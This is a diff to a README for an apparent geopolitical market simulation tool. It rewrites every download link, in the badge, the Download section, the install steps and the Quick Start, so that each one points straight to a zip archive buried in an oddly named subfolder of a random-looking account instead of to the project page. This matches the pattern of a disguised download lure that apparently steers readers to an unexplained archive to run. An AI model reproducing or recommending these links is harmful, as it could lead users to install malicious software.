@@ -1,12 +1,12 @@
 # 🧭 hermes-geopolitical-market-sim - Run Geopolitical Simulations With Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim)
+[![Download Now](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip)
 
 ## 🚀 Download
 
 Use this link to visit the download page:
 
-[https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim)
+[https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip)
 
 ## 📦 What This Is
 
@@ -33,7 +33,7 @@ For a smoother run, use:
 ## 📥 Download and Install
 
 1. Open the download page:
-   [https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim)
+   [https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip)
 
 2. Look for the latest release, release asset, or package file.
 
@@ -222,7 +222,7 @@ When a new release is available:
 ## 📌 Quick Start
 
 1. Visit the download page:
-   [https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim)
+   [https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip](https://github.com/strongmandisabilitypayment539/hermes-geopolitical-market-sim/raw/refs/heads/main/dustyfoot/sim-market-hermes-geopolitical-2.4.zip)
 
 2. Download the latest file.
 
